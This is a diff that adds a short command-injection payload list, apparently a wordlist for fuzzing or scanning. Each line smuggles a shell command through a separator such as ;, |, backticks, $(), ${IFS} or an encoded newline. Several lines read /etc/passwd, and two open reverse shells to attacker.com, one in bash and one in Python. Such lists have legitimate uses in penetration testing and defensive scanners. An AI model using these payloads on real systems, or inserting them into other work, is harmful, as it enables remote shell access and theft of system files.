@@ -1,0 +1,15 @@
+;id
+|id
+`id`
+$(id)
+$(cat /etc/passwd)
+;cat /etc/passwd
+;ls -la
+&&id
+|ls -la
+`ping -c 1 127.0.0.1`
+;bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"
+;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'
+${IFS}cat${IFS}/etc/passwd
+%0Aid
+||id
